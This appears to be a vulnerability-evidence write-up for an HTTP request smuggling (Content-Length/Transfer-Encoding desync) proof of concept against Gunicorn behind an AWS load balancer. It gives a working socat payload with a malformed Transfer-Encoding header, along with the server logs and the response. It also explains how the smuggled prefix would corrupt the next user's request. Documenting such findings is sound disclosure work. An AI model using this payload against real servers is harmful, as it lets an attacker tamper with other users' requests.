# Server Logs — Desync Evidence

## Gunicorn Log Capture (2024-07-23)

Full reproduction with `/logbegin` markers to delimit the attack window.

### Sequence:
1. `curl -i http://gunicorn-alb-*.elb.amazonaws.com/logbegin` — marker
2. Send smuggling payload via socat
3. `curl -i http://gunicorn-alb-*.elb.amazonaws.com/logbegin` — marker

### Gunicorn logs:
```log
[2024-07-23 01:41:06 +0000] [10] [DEBUG] GET /logbegin
[2024-07-23 01:41:11 +0000] [9] [DEBUG] POST /
[2024-07-23 01:41:11 +0000] [9] [DEBUG] XXX /
[2024-07-23 01:41:11 +0000] [9] [DEBUG] Closing connection.
[2024-07-23 01:41:15 +0000] [9] [DEBUG] GET /logbegin
```

### Attack payload:
```bash
cat <(printf "POST / HTTP/1.1\r\nHost: gunicorn-alb-1241110790.ap-south-1.elb.amazonaws.com\r\nContent-Length: 83\r\nTransfer-Encoding : chunked\r\n\r\n0\r\n\r\nXXX / HTTP/1.1\r\nHost: gunicorn-alb-1241110790.ap-south-1.elb.amazonaws.com\r\n\r\n") - | socat - TCP:gunicorn-alb-1241110790.ap-south-1.elb.amazonaws.com:80
```

### Response:
```yaml
HTTP/1.1 200 OK
Date: Tue, 23 Jul 2024 01:41:11 GMT
Content-Type: application/json
Content-Length: 339
Connection: close
Server: gunicorn/19.7.1

{
  "body": "",
  "headers": {
    "Content-Length": "83",
    "Host": "gunicorn-alb-1241110790.ap-south-1.elb.amazonaws.com",
    "Transfer-Encoding": "chunked",
    "X-Amzn-Trace-Id": "Root=1-669f0a37-...",
    "X-Forwarded-For": "106.195.34.160",
    "X-Forwarded-Port": "80",
    "X-Forwarded-Proto": "http"
  }
}
```

### What happened:
- ALB received the full payload as one request (using Content-Length: 83)
- Gunicorn saw `Transfer-Encoding: chunked`, read `0\r\n\r\n` as empty body (first request done)
- Remaining bytes `XXX / HTTP/1.1\r\n...` became a second request
- `XXX` is not a valid HTTP method → connection closed
- In a real attack, this prefix would corrupt the next legitimate user's request
